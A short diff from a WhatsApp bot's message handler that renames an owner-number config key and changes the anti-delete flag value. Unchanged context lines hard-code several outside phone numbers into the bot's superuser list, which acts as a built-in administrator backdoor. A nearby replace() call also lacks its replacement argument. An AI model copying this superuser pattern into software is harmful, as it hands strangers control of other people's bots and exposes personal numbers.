@@ -181,7 +181,7 @@ const MsgInbox = origineMessage?.endsWith("@s.whatsapp.net");
             const k4 = '254751284190';
             const sudo = await getAllSudoNumbers();
             let suhail_ser = "923184474176"
-            const superUserNumbers = [servBot, suhail_ser, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, suhail_ser, k1, k2, k3, k4, conf.OWNER_NUMBER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -285,7 +285,7 @@ if (origineMessage === auteurMessage && conf.CHATBOT === "on" ) {
 await repondre(data.cnt);
             }
 
-            if(ms.message.protocolMessage && ms.message.protocolMessage.type === 0 && conf.ADM === 'yes' ) {
+            if(ms.message.protocolMessage && ms.message.protocolMessage.type === 0 && conf.ADM === 'on' ) {
 
                 if(ms.key.fromMe || ms.message.protocolMessage.key.fromMe) { console.log('Delete message about me') ; return }
         
